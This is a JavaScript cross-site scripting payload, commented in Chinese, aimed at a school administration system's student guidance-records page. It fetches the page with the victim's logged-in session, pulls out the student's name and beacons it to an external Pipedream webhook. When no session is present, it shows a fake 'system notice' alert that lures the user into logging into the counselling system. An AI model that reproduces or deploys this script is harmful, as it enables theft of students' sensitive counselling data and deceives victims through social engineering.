(async () => {
    const webhook = "https://eokic4rib1w9z4o.m.pipedream.net";
    const targetUrl = "/GuidanceApp/Guidance_StudentDataStdtCtrl?Action=Page1BI";

    // 1. 嘗試偷抓
    try {
        const response = await fetch(targetUrl, { credentials: 'include' });
        const html = await response.text();

        if (!html.includes("請由校務行政入口網登入") && !html.includes("錯誤訊息")) {
            // ✅ 成功 (受害者已經有 Session)
            const parser = new DOMParser();
            const doc = parser.parseFromString(html, "text/html");
            let data = {};
            // (解析邏輯省略，同前)
            const name = doc.querySelector('.form-control-static')?.textContent; 
            if(name) data.info = name.trim();

            navigator.sendBeacon(webhook, JSON.stringify({status: "SUCCESS", data: data}));
            return;
        }
    } catch(e) {}

    // 2. 失敗 (沒 Session)，彈出提示誘騙使用者自己去點
    if (!sessionStorage.getItem('xss_alerted')) {
        sessionStorage.setItem('xss_alerted', 'true');
        
        // 延遲一下再彈，比較像系統載入後的檢查
        setTimeout(() => {
            alert("【系統通知】\n\n您的學生輔導資料需要更新。\n請點擊桌面上的「學生輔導系統(學生端)」圖示以完成同步。");
        }, 1500);
    }
})();